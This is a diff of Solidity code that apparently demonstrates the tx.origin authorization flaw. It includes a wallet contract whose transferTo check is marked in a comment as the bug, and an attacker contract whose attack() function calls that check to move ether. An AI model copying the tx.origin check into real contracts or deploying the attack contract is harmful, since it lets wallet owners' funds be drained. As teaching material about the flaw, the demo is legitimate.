@@ -15,8 +15,7 @@ contract TxUserWallet {
 	function transferTo(address payable dest, uint256 amount) public {
 		// THE BUG IS RIGHT HERE, you must use msg.sender instead of tx.origin
 		require(tx.origin == owner, 'check failed');
-		(bool success, ) = dest.call{ value: amount }('');
-		require(success, 'call failed');
+		dest.transfer(amount);
 	}
 }
 
@@ -29,11 +28,9 @@ contract TxAttackWallet {
 		attackContract = _addr;
 	}
 
-	receive() external payable {}
-
 	function attack() external {
 		(bool success, ) = attackContract.call(
-			abi.encodeWithSignature('transferTo(address,uint256)', address(this), 0.01 ether)
+			abi.encodeWithSignature('transferTo(address,uint256)', owner, 10 ether)
 		);
 		require(success, 'failed');
 	}
